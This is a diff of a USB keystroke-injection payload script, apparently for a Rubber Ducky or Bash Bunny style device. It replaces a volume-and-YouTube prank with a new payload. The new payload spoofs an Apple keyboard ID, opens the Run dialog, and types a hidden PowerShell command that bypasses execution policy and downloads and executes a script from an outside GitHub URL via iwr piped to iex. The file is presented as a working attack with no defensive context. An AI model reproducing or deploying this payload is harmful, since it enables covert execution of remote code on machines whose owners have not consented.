@@ -1,27 +1,13 @@
-REM Beginning of the code:
+ATTACKMODE HID VID_0X05AC PID_0X021E
+LED R 200
+#run payload
 
-DELAY 1000
-GUI r
-DELAY 200
-STRING sndvol
-ENTER
-DELAY 1000
-ALT UP
-DELAY 200
-ALT F4
 
-REM Increase the volume to the maximum using the Alt + Up Arrow key combination
-REM Close the volume mixer window using the Alt + F4 key combination
+#Press Windows key + R
+Q GUI r
 
-DELAY 1000
-WINKEY r
-DELAY 200
-STRING chrome
-ENTER
-DELAY 1000
-STRING https://www.youtube.com/watch?v=kTGKPOy11AI
-ENTER
-
-REM Open the "Run" dialog using the Windows + R key combination
-REM Replace "chrome" with the desired browser name (e.g., chrome, edge, safari)
-REM Open the browser with the specified URL (https://www.example.com)
+#Run a powershell script from the url without downloading it
+Q DELAY 100
+STRING powershell -w h -NoP -NonI -Exec Bypass (iwr -UseBasicParsing https://raw.githubusercontent.com/RylexOff/Prout-Script/main/prout_script.ps1).Content | iex
+Q DELAY 100
+Q ENTER
